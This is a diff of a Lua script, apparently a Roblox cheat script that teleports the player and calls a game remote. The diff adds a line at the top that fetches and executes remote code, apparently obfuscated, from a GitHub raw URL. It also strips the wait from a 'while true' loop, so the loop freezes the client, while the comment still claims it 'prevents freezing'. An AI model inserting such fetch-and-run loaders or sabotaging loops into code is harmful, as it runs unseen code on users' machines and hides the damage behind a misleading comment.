@@ -1,6 +1,13 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sigmarizzler11aa/sts/refs/heads/main/Protected_4047913774660354.lua"))()
+
+task.wait(1)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local Remote = game:GetService("ReplicatedStorage").Remotes.TimeStorage
+
+print("LB Loaded")
 
 local targetPosition1 = Vector3.new(-222, 10, 53)
 local targetPosition2 = Vector3.new(-240, 10, 53)
@@ -30,9 +37,7 @@ RunService.Heartbeat:Connect(function()
                         infiniteLoopActive = true
                         -- Simulate a "while true do end" safely
                         spawn(function()
-                            while true do
-                                task.wait()  -- prevents freezing
-                                -- put any repeating code here if needed
+                            while true do -- prevents freezing
                             end
                         end)
                     end
@@ -43,7 +48,7 @@ RunService.Heartbeat:Connect(function()
 end)
 
 
-task.wait(1)
+task.wait(3)
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
